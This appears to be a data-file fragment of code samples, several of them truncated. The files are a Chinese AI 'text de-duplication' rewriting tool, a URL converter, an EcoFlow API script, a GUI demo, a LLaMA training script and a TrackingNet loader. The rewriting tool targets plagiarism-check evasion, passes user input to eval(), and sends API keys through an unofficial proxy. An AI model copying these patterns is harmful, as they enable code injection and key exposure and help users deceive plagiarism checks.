x3iZnyOENziwlNl/chVzY/Ak3tAIhV1qlhe+waUlnOPMPPt5IgTYjL5wijGpwq7qxCekqQ+7lkYsOCcKgUkBOCvJSO5RXX84NE9gbZkM7FYSb7VkWCUuiDWRX1RN+e1dTFMpzERyCT6LvmDw4rPwJAy1Hnd+zNOQ9LSEGYM+LYUgRYNBMVoHHDgQFbaqVEKLhheARBeBOePq974r4KyfUPnX3yh4ZwnvmvANgaIyUe19SbB+UkNPqmAkuyTeEQ+037e8wtOC0tNTifQmkv5ewlwaEBzl2XRcHr7+AQobUfdKPSjFQhzGF48iMtkbmucm7575+kPy8SCc4SAhrqNqFmHd5DlFAGCmc2wRZ14C1AGyBJ2VDiVTa7/6aHiqykm+bJpgAOOZStelj/ughw/Au2Hn4/7nTWwzZ/SLWORjIdFSCQGPpT5XihtrVunlLLEANaz2Qcd7ojFnpxtfVWwjHcRFqfucEHwjWi0/GWUXcHXDvaI/lhrsLbhUBlC1pCBi1aoO1gqsbx9pQ7Beasnu3sKUDqn4gxreEO8rOe6UPnCRcL791Xn4XWrwQ8kHb+UusOCw3fZgCAgdeesfOZQI+XYpROgwnwlG7mQwfBG0nVnyk930d78uVX1hsHZz7fBoZI2zD3Bi4Tea4U3LXJMRx+uOtZzZfsh5XG/YkTgMZ6mej+QusEusP/0M5v5NPRQqzQGT8gY3XNKgRg8tjjWJ8nCr887m73acbEodV2aIFku0tKMHs5GvynvF2GRP5DIoSuvgDwD2+aATbtjfGiYxufbFZROqzkc22eKSKhAxLxFn/l90U7/8KVDY3nNCkp5Pr3xQcm89g520BY0alTtf6rj90OpqXL36B2fg",
    "import tkinter as tk\r\nfrom tkinter import ttk\r\nfrom tkinter import filedialog, messagebox\r\nimport threading\r\nfrom docx import Document\r\nimport erniebot\r\nimport os\r\nimport queue\r\nfrom openai import OpenAI\r\nfrom dashscope import Generation\r\nfrom http import HTTPStatus\r\nfrom docx.shared import Pt\r\nimport json\r\nimport dashscope\r\n\r\n# \u8bbe\u7f6e\u9ed8\u8ba4\u503c\r\ndefault_access_token = ''\r\ndefault_prompt = [\r\n    \"\u4f60\u662f\u4e00\u4e2a\u6587\u672c\u964d\u91cd\u673a\u5668\uff0c\u4f60\u53ea\u6267\u884c\u964d\u91cd\u6539\u5199 \u8bed\u5e8f\u98a0\u5012 \u987a\u5e8f\u8c03\u6362 \u540c\u4e49\u66ff\u6362 \u53e5\u5b50\u610f\u601d\u4e0d\u53d8 \u4e3b\u52a8\u53e5\u6539\u88ab\u52a8\u53e5 \u88ab\u52a8\u53e5\u6539\u4e3b\u52a8\u53e5 \u76f4\u63a5\u8f93\u51fa\u7ed3\u679c\",\r\n    \"\u4f60\u662f\u4e00\u4e2a\u6587\u672c\u6da6\u8272\u673a\u5668\uff0c\u4f60\u53ea\u6267\u884c\u6da6\u8272\u6587\u672c\u4f7f\u5176\u66f4\u6d41\u7545\u3001\u66f4\u5177\u5438\u5f15\u529b\u540c\u65f6\u4fdd\u7559\u539f\u610f \u53e5\u5b50\u610f\u601d\u4e0d\u53d8 \u76f4\u63a5\u8f93\u51fa\u7ed3\u679c\",\r\n    \"\u4f60\u662f\u4e00\u4e2a\u6587\u672c\u6821\u5bf9\u673a\u5668\uff0c\u4f60\u53ea\u6267\u884c\u6821\u5bf9\u6587\u5b57 \u6b63\u786e\u8868\u8fbe\u53e5\u5b50 \u4e0d\u80fd\u51fa\u73b0\u903b\u8f91\u9519\u8bef \u53e5\u5b50\u610f\u601d\u4e0d\u53d8 \u76f4\u63a5\u8f93\u51fa\u7ed3\u679c\"\r\n]\r\ndefault_min_paragraph_length = '100'\r\n\r\ndef call_chatgpt_thread(api_key, model, prompt, text, result_queue):\r\n    try:\r\n        client = OpenAI(\r\n            api_key=api_key,\r\n            base_url=\"https://chatgpt.24z.cn/v1\"\r\n        )\r\n        completion = client.chat.completions.create(\r\n            model=model,\r\n            messages=[\r\n                {\"role\": \"system\", \"content\": prompt},\r\n                {\"role\": \"user\", \"content\": text}\r\n            ]\r\n        )\r\n        response = completion.choices[0].message.content\r\n        result_queue.put(response.replace(\" \", \"\").replace(\"\\n\", \"\"))\r\n    except Exception as e:\r\n        result_queue.put(e)\r\n\r\ndef call_erniebot_thread(api_key, model, prompt, text, result_queue):\r\n    erniebot.api_type = 'aistudio'\r\n    erniebot.access_token = api_key\r\n    try:\r\n        response_stream = erniebot.ChatCompletion.create(\r\n            model=model,\r\n            messages=[{\r\n                'role': 'user',\r\n                'content': text\r\n            }],\r\n            system=prompt,\r\n            stream=True\r\n        )\r\n        result_queue.put(''.join([response.get_result() for response in response_stream]).replace(\" \", \"\").replace(\"\\n\", \"\"))\r\n    except Exception as e:\r\n        result_queue.put(e)\r\n\r\ndef call_qwen_thread(api_key, model, prompt, text, result_queue):\r\n    try:\r\n        dashscope.api_key =api_key\r\n        if model not in [\"qwen-1.8b-chat\", \"qwen-72b-chat\", \"qwen1.5-72b-chat\", \"qwen1.5-14b-chat\", \"qwen1.5-7b-chat\",\r\n                         \"qwen-14b-chat\", \"qwen-7b-chat\", \"qwen-1.8b-longcontext-chat\"]:\r\n            gen = Generation.call(\r\n                model=model,\r\n                messages=[\r\n                    {\"role\": \"system\", \"content\": prompt},\r\n                    {\"role\": \"user\", \"content\": text}\r\n                ],\r\n                result_format='message',\r\n                enable_search=True,\r\n                stream=True,\r\n                incremental_output=True\r\n            )\r\n        else:\r\n            gen = Generation.call(\r\n                model=model,\r\n                messages=[\r\n                    {\"role\": \"system\", \"content\": prompt},\r\n                    {\"role\": \"user\", \"content\": text}\r\n                ],\r\n                result_format='message',\r\n                stream=True,\r\n                incremental_output=True\r\n            )\r\n        resp = \"\"\r\n        for response in gen:\r\n            if response.status_code == HTTPStatus.OK:\r\n                response = response.output.choices[0].message.content\r\n                resp += response\r\n        response = resp\r\n\r\n        result_queue.put(response.replace(\" \", \"\").replace(\"\\n\", \"\"))\r\n    except Exception as e:\r\n        result_queue.put(e)\r\n\r\ndef call_ai(selected_option, api_key, model, prompt, text):\r\n    result_queue = queue.Queue()\r\n    if selected_option == \"\u6587\u5fc3\u4e00\u8a00\":\r\n        thread = threading.Thread(target=call_erniebot_thread, args=(api_key, model, prompt, text, result_queue))\r\n        thread.start()\r\n        return str(result_queue.get())\r\n    elif selected_option == \"\u901a\u4e49\u5343\u95ee\":\r\n        thread = threading.Thread(target=call_qwen_thread, args=(api_key, model, prompt, text, result_queue))\r\n        thread.start()\r\n        return str(result_queue.get())\r\n    else:\r\n        thread = threading.Thread(target=call_chatgpt_thread, args=(api_key, model, prompt, text, result_queue))\r\n        thread.start()\r\n        return str(result_queue.get())\r\n\r\ndef process_file():\r\n    selected_option = dropdown.get()\r\n    access_token_val = access_token.get().strip()\r\n    model_val = model_dropdown.get().strip()\r\n    prompt_val = prompt_var.get(\"1.0\", tk.END).strip()\r\n    min_paragraph_length_val = min_paragraph_length_var.get().strip()\r\n    file_path_val = input_file_path_var.get().strip()\r\n    \r\n    try:\r\n        file_path_val = eval(file_path_val)\r\n    except:\r\n        pass\r\n\r\n    if isinstance(file_path_val, str):\r\n        output_path = output_file_path_var.get().strip()\r\n        if not all([access_token_val, model_val, prompt_val, min_paragraph_length_val, file_path_val, output_path]):\r\n            messagebox.showwarning(\"\u63d0\u793a\", \"\u4e0d\u80fd\u4e3a\u7a7a\")\r\n        else:\r\n            min_paragraph_length = int(min_paragraph_length_val)\r\n            doc = Document(file_path_val)\r\n\r\n            if not any(style.name == 'Normal' for style in doc.styles):\r\n                doc_styles = doc.styles\r\n                new_style = doc_styles.add_style('Normal', 1)\r\n",
    "import re\r\n\r\ndef convert_urls(input_file, output_file):\r\n    # \u7b2c\u4e00\u79cd\u6a21\u5f0f\u5339\u914d\u89c4\u5219\r\n    pattern1 = re.compile(r'https://www\\.alipan\\.com/s/(\\w+)/folder/(\\w+)')\r\n    # \u7b2c\u4e8c\u79cd\u6a21\u5f0f\u5339\u914d\u89c4\u5219\r\n    pattern2 = re.compile(r'(.+) https://www\\.alipan\\.com/s/(\\w+)/folder/(\\w+) (\\d+)')\r\n\r\n    try:\r\n        # \u8bfb\u53d6\u8f93\u5165\u6587\u4ef6\uff0c\u6307\u5b9a\u4f7f\u7528utf-8\u7f16\u7801\uff0c\u5e76\u786e\u4fdd\u884c\u7ed3\u675f\u7b26\u4e3aUnix\u683c\u5f0f\r\n        with open(input_file, 'r', encoding='utf-8', newline='') as file:\r\n            urls = [line.strip() for line in file if line.strip()]\r\n    except FileNotFoundError:\r\n        print(f\"\u65e0\u6cd5\u627e\u5230\u8f93\u5165\u6587\u4ef6\uff1a{input_file}\")\r\n        return\r\n    except UnicodeDecodeError as e:\r\n        print(f\"\u6587\u4ef6\u7f16\u7801\u9519\u8bef\uff1a{e}\")\r\n        return\r\n\r\n    # \u51c6\u5907\u8f6c\u6362\u540e\u7684URL\u5217\u8868\r\n    converted_urls = []\r\n\r\n    # \u8f6c\u6362\u6bcf\u4e2aURL\r\n    for url in urls:\r\n        # \u5c1d\u8bd5\u7b2c\u4e00\u79cd\u89c4\u5219\u5339\u914d\u548c\u8f6c\u6362\r\n        if pattern1.search(url):\r\n            converted = pattern1.sub(r'\\1 \\2', url)\r\n        # \u5c1d\u8bd5\u7b2c\u4e8c\u79cd\u89c4\u5219\u5339\u914d\u548c\u8f6c\u6362\r\n        elif pattern2.search(url):\r\n            converted = pattern2.sub(r'\\1 \\2 \\3 \\4', url)\r\n        else:\r\n            # \u5982\u679c\u90fd\u4e0d\u5339\u914d\uff0c\u4fdd\u7559\u539f\u59cbURL\r\n            converted = url\r\n        # \u5c06\u8f6c\u6362\u540e\u7684URL\u6dfb\u52a0\u5230\u5217\u8868\uff0c\u5e76\u5728\u6bcf\u4e2aURL\u540e\u6dfb\u52a0\u6362\u884c\u7b26\r\n        converted_urls.append(converted + '\\n')\r\n\r\n    # \u8f93\u51fa\u7ed3\u679c\u5230\u6307\u5b9a\u7684\u8f93\u51fa\u6587\u4ef6\r\n    try:\r\n        with open(output_file, 'w', encoding='utf-8', newline='\\n') as file:\r\n            file.writelines(converted_urls)\r\n    except IOError as e:\r\n        print(f\"\u6587\u4ef6\u5199\u5165\u9519\u8bef\uff1a{e}\")\r\n        return\r\n\r\n    print(f'\u8f6c\u6362\u5b8c\u6210\uff0c\u8f6c\u6362\u540e\u7684URLs\u5df2\u4fdd\u5b58\u5728 \"{output_file}\" \u6587\u4ef6\u4e2d\u3002')\r\n\r\n# \u8f93\u5165\u6587\u4ef6\u548c\u8f93\u51fa\u6587\u4ef6\u7684\u8def\u5f84\r\ninput_file_path = 'input_urls.txt'\r\noutput_file_path = 'alishare_list.txt'\r\n\r\n# \u8c03\u7528\u8f6c\u6362\u51fd\u6570\r\nconvert_urls(input_file_path, output_file_path)\r\n\r\n# \u5728\u811a\u672c\u6700\u540e\u6dfb\u52a0\u4ee5\u4e0b\u4ee3\u7801\uff0c\u4ee5\u4fbf\u5728\u7a97\u53e3\u4e2d\u67e5\u770b\u7ed3\u679c\r\ninput(\"\u6309Enter\u952e\u9000\u51fa...\")\r\n",
    "# Example Code to obtain data from API for specific sensors on an EcoFlow device\r\n# Mark Hicks - 01/29/2024\r\n# written by mail@sven-erbe.de - 14/02/2024\r\n\r\n# short description\r\n# script set powerstream - WN511_SET_PERMANENT_WATTS_PACK depend on TotalPower\r\n# function: set_ef_powerstream_custom_load_power(SerialNumber=None,TotalPower=None,Automation=False)\r\n# \r\n# \r\n# prerequest:\r\n# Pyscript: Python scripting integration - https://github.com/custom-components/pyscript\r\n# ecoflow AccessKey and SecretKey - needs to request on https://developer-eu.ecoflow.com/\r\n# Powerstream\r\n# please change accesskey and secret in the script\r\n\r\nimport sys\r\nimport json\r\nimport requests\r\nimport hashlib\r\nimport hmac\r\nimport random\r\nimport time\r\nimport binascii\r\nfrom urllib.parse import urlencode\r\n\r\n\r\ndef hmac_sha256(data, key):\r\n    hashed = hmac.new(key.encode('utf-8'), data.encode('utf-8'), hashlib.sha256).digest()\r\n    sign = binascii.hexlify(hashed).decode('utf-8')\r\n    return sign\r\n\r\ndef get_map(json_obj, prefix=\"\"):\r\n  def flatten(obj, pre=\"\"):\r\n    result = {}\r\n    if isinstance(obj, dict):\r\n      for k, v in obj.items():\r\n        result.update(flatten(v, f\"{pre}.{k}\" if pre else k))\r\n    elif isinstance(obj, list):\r\n      for i, item in enumerate(obj):\r\n        result.update(flatten(item, f\"{pre}[{i}]\"))\r\n    else: result[pre] = obj\r\n    return result\r\n  return flatten(json_obj, prefix)\r\n\r\ndef get_qstr(params): return '&'.join([f\"{key}={params[key]}\" for key in sorted(params.keys())])\r\n\r\ndef put_api(url, key, secret, params=None):\r\n  nonce     = str(random.randint(100000, 999999))\r\n  timestamp = str(int(time.time() * 1000))\r\n  headers   = {'accessKey':key,'nonce':nonce,'timestamp':timestamp}\r\n  sign_str  = (get_qstr(get_map(params)) + '&' if params else '') + get_qstr(headers)\r\n  headers['sign'] = hmac_sha256(sign_str, secret)\r\n  response = task.executor(requests.put, url, headers=headers, json=params)\r\n  if response.status_code == 200: return response.json()\r\n  else: print(f\"get_api: {response.text}\")\r\n\r\ndef get_api(url, key, secret, params=None):\r\n  nonce     = str(random.randint(100000, 999999))\r\n  timestamp = str(int(time.time() * 1000))\r\n  headers   = {'accessKey':key,'nonce':nonce,'timestamp':timestamp}\r\n  sign_str  = (get_qstr(get_map(params)) + '&' if params else '') + get_qstr(headers)\r\n  headers['sign'] = hmac_sha256(sign_str, secret)\r\n  response = task.executor(requests.get, url, headers=headers, json=params)\r\n  if response.status_code == 200: return response.json()\r\n  else: print(f\"get_api: {response.text}\")\r\n\r\ndef post_api(url, key, secret, params=None):\r\n  nonce     = str(random.randint(100000, 999999))\r\n  timestamp = str(int(time.time() * 1000))\r\n  headers   = {'accessKey':key,'nonce':nonce,'timestamp':timestamp}\r\n  sign_str  = (get_qstr(get_map(params)) + '&' if params else '') + get_qstr(headers)\r\n  headers['sign'] = hmac_sha256(sign_str, secret)\r\n  response = task.executor(requests.post, url, headers=headers, json=params)\r\n  #if response.status_code == 200: return response.json()\r\n  if response.status_code == 200: return response\r\n  else: print(f\"get_api: {response.text}\")\r\n\r\ndef check_if_device_is_online(SN=None,payload=None):\r\n\r\n    parsed_data = payload\r\n    desired_device_sn = SN\r\n\r\n    device_found = False\r\n\r\n    for device in parsed_data.get('data', []):\r\n        if device.get('sn') == desired_device_sn:\r\n            device_found = True\r\n            online_status = device.get('online', 0)\r\n\r\n            if online_status == 1:\r\n                print(f\"The device with SN '{desired_device_sn}' is online.\")\r\n                return \"online\"\r\n            else:\r\n                print(f\"The device with SN '{desired_device_sn}' is offline.\")\r\n                return \"offline\"\r\n    if not device_found:\r\n        print(f\"Device with SN '{desired_device_sn}' not found in the data.\")\r\n        return \"devices not found\"\r\n\r\n@service\r\ndef set_ef_powerstream_custom_load_power(SerialNumber=None,TotalPower=None,Automation=False):\r\n\r\n    log.info(f\"set_ef_powerstream_custom_load_power: got SerialNumber {SerialNumber} TotalPower {TotalPower} Automation {Automation}\")\r\n\r\n    if SerialNumber is None:\r\n        log.info(f\"SerialNumber is not provided. Exiting function.\")\r\n        print(\"SerialNumber is not provided. Exiting function.\")\r\n        return  # Exit the function if SerialNumber is None\r\n\r\n    url = 'https://api.ecoflow.com/iot-open/sign/device/quota'\r\n    url_device = 'https://api.ecoflow.com/iot-open/sign/device/list'\r\n\r\n    # Replace with valid access/secret keys and device SN\r\n    key = 'example123'\r\n    secret = 'example123'\r\n\r\n    \r\n    cmdCode = 'WN511_SET_PERMANENT_WATTS_PACK'\r\n    TotalPowerOffSet = 0\r\n\r\n    # collect status of the devices\r\n    payload = get_api(url_device,key,secret,{\"sn\":SerialNumber})\r\n\r\n    check_ps_status = check_if_device_is_online(SerialNumber,payload)\r\n\r\n\r\n    # collect current permanentWatts\r\n    quotas = [\"20_1.permanentWatts\"]\r\n    params  = {\"quotas\":quotas}\r\n\r\n    payload = post",
    "import FreeSimpleGUI as sg\n\"\"\"\n    Demo - Base64 Buttons with Images\n\n    This is perhaps the easiest, quickest, and safest way to use buttons with images in PySimpleGUI.\n    By putting the button into your code, then you only have to distribute a single file.\n\n    Copyright 2022 PySimpleGUI\n\"\"\"\n\n# First the button images\n\nplay = b'iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAABmJLR0QA/wD/AP+gvaeTAAAByElEQVRoge3ZMWsUQRjG8Z8RFSKCgoJp0qSJjVpoZ2clkk8g5CtYpU+TD5DSUkvbVCFNYiM2dhZqY6GFQooEISGai8Xu4HgmcnM3c+su+4fj2L2dmedhb+Z95x16enp6hljBxaZF5OAE7/GoaSGTchJ9tnCrWTnjE0zs19+HWMPlJkWNQzAyh2c4rq+/YBnnmpOWRjASuIfX0f0d3GlAVzLDRmBG9Ta+1r8d4wVuTFdaGqcZCVzFOn7Uz+ziKc5PR1oa/zISWMRm9OxbPCisK5lRjASW8Clqs4H5MrLSSTECs1jFQd3ue319KbewVFKNBBbwMmr/EY8z6kpmXCOBh3gX9dNYdjCpEbigWs326r6OVKvdlQn7TSKHkcCcKt4MNJAd5DQSuI83Ud87uJ15jL8oYYTf2cE3f2YH1wuMhXJGAtdU8+WnwtlBaSOBu3gVjZc9O5iWEapJ/wSf6zEHeI6bZzWYmY6u/4v+rzUirZ/snVh+hwPitpYFxNanKJ1IGk9L4xcz6Eom18bqg5ZtrDqx1Y2LDwPVG2lV8aH15aDWF+jOKpkWi8o5GKWIXTwq56BzxwqdOejpxNFbJw5DO3M83dPT02J+AbN50HbYDxzCAAAAAElFTkSuQmCC'\nstop = b'iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAABmJLR0QA/wD/AP+gvaeTAAAAaklEQVRoge3ZQQqAMAxFwSre/8p6AZFUiXzKzLqLPNJVOwYAvLcVzpztU9Q8zrr/NUW3Y+JsZXsdSjdimY0ISSMkjZA0QtIISSMkjZA0QtIISSMkjZA0QtIISSMkzcxrfMo/ya1lNgIAX1zq+ANHUjXZuAAAAABJRU5ErkJggg=='\neject = b'iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAABmJLR0QA/wD/AP+gvaeTAAAByklEQVRoge3YO2gUURSA4S+JRnyACIGADyxERAsb0UKrWIidWIidlSA2YpFWSauNVtrYiIU2YpFCLGwEEWwsBAsLEbFQFARFfKBZizkyK5pkZvZmZ7PeH05z595z/sPszpxdMplMJpMZbDZFLGsm8CxiomWXxqzBQ3QiHmNdq0YNGMc9RQOvIjqxNt6iVy1GcF0h/h47sR1vY+0mRluzq8ElhfBn7O9a34tPce1KC161OK8Q/Y7D/7h+EF9jz7k+etXilELwJ44vsO8ofsTeM33wqsURpdzZCvtPK5s+toRetZjCF4XYTI1zM3HmGw4lt6rJbnxQCF1tcP5ynP2IPQm9arENb0LkDsYa5BjFrcjxDjuS2VVkI16EwH2s6iHXStxVvjy39GxXkfV4Iu3Y0T3OPMWGBDkXZDUeRMHnmEyY+/eA2cEjrE2Y+w/GcDsKvcbWJaixGS+jxixWpC4wgmvK+WlX6gJddM9lN6J2Mi4q56cDKRPPwz7lXHYhVdJp5W+KtmK61yZOYG4AGpnDyV6byWT+ZxZ7Rnf6YlGdeX2XxZ8AVag6AiR9uzZg0U/G0NyR3MigUfU7MmhPr78YmjuSyWQymUxmmPgFokSdfYSQKDwAAAAASUVORK5CYII='\n\nsg.theme('Light Green 3')\n\n# Define the window's layout\nlayout = [[sg.Button(image_data=play, key='-PLAY-',  button_color=sg.theme_background_color(), border_width=0),\n           sg.Button(image_data=stop, key='-STOP-',  button_color=sg.theme_background_color(), border_width=0),\n           sg.Button(image_data=eject, key='-EXIT-',  button_color=sg.theme_background_color(), border_width=0)]  ]\n\n# Create the window\nwindow = sg.Window('Simple Base64 Buttons', layout)\n\nwhile True:                             # Event Loop\n    event, values = window.read()       # type: str, dict\n    print(event, values)\n    if event in (sg.WIN_CLOSED, '-EXIT-'):         # If the user exits\n        break\nwindow.close()          # Exiting so clean up\n",
    "#    Modification Copyright 2024 Zhenyu He\n#    Modification Copyright 2023 Dawei Zhu\n#    Copyright 2023 Rohan Taori, Ishaan Gulrajani, Tianyi Zhang, Yann Dubois, Xuechen Li\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\");\n#    you may not use this file except in compliance with the License.\n#    You may obtain a copy of the License at\n#\n#        http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS,\n#    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n#    See the License for the specific language governing permissions and\n#    limitations under the License.\n\nimport copy\nimport logging\nimport random\nimport os\nfrom itertools import chain\nfrom dataclasses import dataclass, field\nfrom typing import Optional, Dict, Sequence\n\nimport torch\nimport torch.distributed\nimport transformers\nimport deepspeed\nfrom config_llama import MyLlamaConfig\nfrom torch.utils.data import Dataset\nfrom transformers import Trainer, AutoConfig, default_data_collator, AutoTokenizer\nfrom datasets import load_dataset, load_from_disk\n\nfrom my_modeling_llama_bipe_rope import MyLlamaForCausalLM as MyLlamaForCausalLM_bipe_rope\nfrom my_modeling_llama_bipe_alibi import MyLlamaForCausalLM as MyLlamaForCausalLM_bipe_alibi\n\ntransformers.logging.set_verbosity_info()\n\n@dataclass\nclass ModelArguments:\n    config_name: Optional[str] = field(default=None)\n    model_name_or_path: Optional[str] = field(default=None)\n\n\n@dataclass\nclass DataArguments:\n    dataset_cache_dir: str = field(default=None, metadata={\"help\": \"Path to the data.\"})\n\n\n@dataclass\nclass TrainingArguments(transformers.TrainingArguments):\n    cache_dir: Optional[str] = field(default=None)\n    optim: str = field(default=\"adamw_torch\")\n    model_max_position_embeddings: int = field(\n        default=1024,\n        metadata={\"help\": \"Maximum position embeddings.\"},\n    )\n    rope_scaling_type: Optional[str] = field(default=None)\n    rope_scaling_factor: float = field(default=1.0)\n    resume_from_checkpoint: Optional[bool] = field(default=None)\n\n\ndef safe_save_model_for_hf_trainer(trainer: transformers.Trainer, output_dir: str):\n    \"\"\"Collects the state dict and dump to disk.\"\"\"\n    state_dict = trainer.model.state_dict()\n    if trainer.args.should_save:\n        cpu_state_dict = {key: value.cpu() for key, value in state_dict.items()}\n        del state_dict\n        trainer._save(output_dir, state_dict=cpu_state_dict)  # noqa\n\n              \ndef train():\n    parser = transformers.HfArgumentParser((ModelArguments, DataArguments, TrainingArguments))\n    model_args, data_args, training_args = parser.parse_args_into_dataclasses()\n\n    if model_args.config_name:\n        config = MyLlamaConfig.from_pretrained(model_args.config_name)\n    elif model_args.model_name_or_path:\n        config = MyLlamaConfig.from_pretrained(model_args.model_name_or_path)\n    else:\n        raise NotImplementedError\n\n    scaled_max_position_embeddings=int(training_args.model_max_position_embeddings * training_args.rope_scaling_factor)\n    config.max_position_embeddings=scaled_max_position_embeddings\n\n    if training_args.rope_scaling_type is not None:\n        config.rope_scaling={\"type\": training_args.rope_scaling_type, \"factor\": training_args.rope_scaling_factor}\n        if training_args.rope_scaling_type == \"yarn\":\n            config.rope_scaling[\"original_max_position_embeddings\"] = training_args.model_max_position_embeddings\n        \n    if config.rpe_type == \"bipe_rope\" or config.rpe_type == \"rope\":\n        LlamaForCausalLM = MyLlamaForCausalLM_bipe_rope\n    elif config.rpe_type == \"bipe_alibi\" or config.rpe_type == \"alibi\":\n        LlamaForCausalLM = MyLlamaForCausalLM_bipe_alibi\n    else:\n        raise NotImplementedError\n\n    if model_args.model_name_or_path:\n        model = LlamaForCausalLM.from_pretrained(\n            model_args.model_name_or_path,\n            config=config,\n        )\n    else:\n        model = LlamaForCausalLM(config)\n        n_params = sum({p.data_ptr(): p.numel() for p in model.parameters()}.values())\n        if training_args.local_rank == 0:\n            print(f\"Training new model from scratch - Total size={n_params/2**20:.2f}M params\")\n\n    tokenizer = AutoTokenizer.from_pretrained(\n        \"llama_tokenizer\",\n        use_fast=True,\n    )\n\n    raw_datasets = load_from_disk(data_args.dataset_cache_dir)\n    # raw_datasets = load_dataset('monology/pile-uncopyrighted')\n\n    column_names = raw_datasets[\"train\"].column_names\n    text_column_name = \"text\" if \"text\" in column_names else column_names[0]\n\n    def tokenize_function(examples):\n        return tokenizer(examples[text_column_name])\n     \n\n    if training_args.local_rank > 0: \n        torch.distributed.barrier()\n\n    tokenized_datasets = raw_datasets.map(\n        tokenize_function,\n        batched=True,\n        num_proc=64,\n        remove_columns=column_names,\n       ",
    "import torch\nimport os\nimport os.path\nimport numpy as np\nimport pandas\nimport random\nfrom collections import OrderedDict\n\nfrom lib.train.data import jpeg4py_loader\nfrom .base_video_dataset import BaseVideoDataset\nfrom lib.train.admin import env_settings\n\n\ndef list_sequences(root, set_ids):\n    \"\"\" Lists all the videos in the input set_ids. Returns a list of tuples (set_id, video_name)\n\n    args:\n        root: Root directory to TrackingNet\n        set_ids: Sets (0-11) which are to be used\n\n    returns:\n        list - list of tuples (set_id, video_name) containing the set_id and video_name for each sequence\n    \"\"\"\n    sequence_list = []\n\n    for s in set_ids:\n        anno_dir = os.path.join(root, \"TRAIN_\" + str(s), \"anno\")\n\n        sequences_cur_set = [(s, os.path.splitext(f)[0]) for f in os.listdir(anno_dir) if f.endswith('.txt')]\n        sequence_list += sequences_cur_set\n\n    return sequence_list\n\n\nclass TrackingNet(BaseVideoDataset):\n    \"\"\" TrackingNet dataset.\n\n    Publication:\n        TrackingNet: A Large-Scale Dataset and Benchmark for Object Tracking in the Wild.\n        Matthias Mueller,Adel Bibi, Silvio Giancola, Salman Al-Subaihi and Bernard Ghanem\n        ECCV, 2018\n        https://ivul.kaust.edu.sa/Documents/Publications/2018/TrackingNet%20A%20Large%20Scale%20Dataset%20and%20Benchmark%20for%20Object%20Tracking%20in%20the%20Wild.pdf\n\n    Download the dataset using the toolkit https://github.com/SilvioGiancola/TrackingNet-devkit.\n    \"\"\"\n    def __init__(self, root=None, image_loader=jpeg4py_loader, set_ids=None, data_fraction=None):\n        \"\"\"\n        args:\n            root        - The path to the TrackingNet folder, containing the training sets.\n            image_loader (jpeg4py_loader) -  The function to read the images. jpeg4py (https://github.com/ajkxyz/jpeg4py)\n                                            is used by default.\n            set_ids (None) - List containing the ids of the TrackingNet sets to be used for training. If None, all the\n                            sets (0 - 11) will be used.\n            data_fraction - Fraction of dataset to be used. The complete dataset is used by default\n        \"\"\"\n        root = env_settings().trackingnet_dir if root is None else root\n        super().__init__('TrackingNet', root, image_loader)\n\n        if set_ids is None:\n            set_ids = [i for i in range(12)]\n\n        self.set_ids = set_ids\n\n        # Keep a list of all videos. Sequence list is a list of tuples (set_id, video_name) containing the set_id and\n        # video_name for each sequence\n        self.sequence_list = list_sequences(self.root, self.set_ids)\n\n        if data_fraction is not None:\n            self.sequence_list = random.sample(self.sequence_list, int(len(self.sequence_list) * data_fraction))\n\n        self.seq_to_class_map, self.seq_per_class = self._load_class_info()\n\n        # we do not have the class_lists for the tracking net\n        self.class_list = list(self.seq_per_class.keys())\n        self.class_list.sort()\n\n    def _load_class_info(self):\n        ltr_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), '..')\n        class_map_path = os.path.join(ltr_path, 'data_specs', 'trackingnet_classmap.txt')\n\n        with open(class_map_path, 'r') as f:\n            seq_to_class_map = {seq_class.split('\\t')[0]: seq_class.rstrip().split('\\t')[1] for seq_class in f}\n\n        seq_per_class = {}\n        for i, seq in enumerate(self.sequence_list):\n            class_name = seq_to_class_map.get(seq[1], 'Unknown')\n            if class_name not in seq_per_class:\n                seq_per_class[class_name] = [i]\n            else:\n                seq_per_class[class_name].append(i)\n\n        return seq_to_class_map, seq_per_class\n\n    def get_name(self):\n        return 'trackingnet'\n\n    def has_class_info(self):\n        return True\n\n    def get_sequences_in_class(self, class_name):\n        return self.seq_per_class[class_name]\n\n    def _read_bb_anno(self, seq_id):\n        set_id = self.sequence_list[seq_id][0]\n        vid_name = self.sequence_list[seq_id][1]\n        bb_anno_file = os.path.join(self.root, \"TRAIN_\" + str(set_id), \"anno\", vid_name + \".txt\")\n        gt = pandas.read_csv(bb_anno_file, delimiter=',', header=None, dtype=np.float32, na_filter=False,\n                             low_memory=False).values\n        return torch.tensor(gt)\n\n    def get_sequence_info(self, seq_id):\n        bbox = self._read_bb_anno(seq_id)\n\n        valid = (bbox[:, 2] > 0) & (bbox[:, 3] > 0)\n        visible = valid.clone().byte()\n        return {'bbox': bbox, 'valid': valid, 'visible': visible}\n\n    def _get_frame(self, seq_id, frame_id):\n        set_id = self.sequence_list[seq_id][0]\n        vid_name = self.sequence_list[seq_id][1]\n        frame_path = os.path.join(self.root, \"TRAIN_\" + str(set_id), \"frames\", vid_name, str(frame_id) + \".jpg\")\n        return self.image_loader(frame_path)\n\n    def _get_class(self, seq_id):\n        seq_name = self.sequence_list[seq_id][1]\n        return se",
